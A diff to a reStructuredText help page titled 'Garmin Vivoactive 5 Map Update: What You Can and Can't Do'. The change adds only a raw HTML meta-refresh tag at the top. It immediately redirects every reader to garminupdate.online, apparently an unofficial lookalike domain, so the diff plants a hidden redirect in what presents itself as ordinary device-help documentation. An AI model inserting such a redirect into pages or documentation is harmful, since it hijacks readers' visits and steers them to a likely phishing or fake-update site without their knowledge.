@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Vivoactive 5 Map Update: What You Can and Can’t Do
 ===============================================
 
